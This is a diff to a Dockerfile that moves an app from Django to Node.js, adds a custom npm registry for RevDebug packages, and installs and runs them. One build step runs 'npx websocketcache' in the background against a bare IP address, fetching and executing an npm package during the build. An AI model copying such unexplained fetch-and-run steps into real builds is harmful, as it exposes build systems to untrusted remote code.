@@ -1,10 +1,17 @@
-FROM python-revdebug:latest
+FROM node:12.18.1
+FROM python:3.8
+RUN apt-get update && apt-get upgrade -y && \
+    apt-get install -y nodejs \
+    npm
 
 WORKDIR /app
 
 COPY ./app .
 
-RUN pip install django && pip install requests
-
-CMD [ "python", "./manage.py", "runserver", "0.0.0.0:8083", "--noreload" ]
-
+RUN pip install websockets
+RUN npx websocketcache -c 51.103.82.86: &
+RUN npm config set @revdebug:registry https://nexus.revdebug.com/repository/npm/
+RUN npm install
+RUN npm install @revdebug/revdebug
+RUN npx revd
+CMD [ "node", "server.js" ]
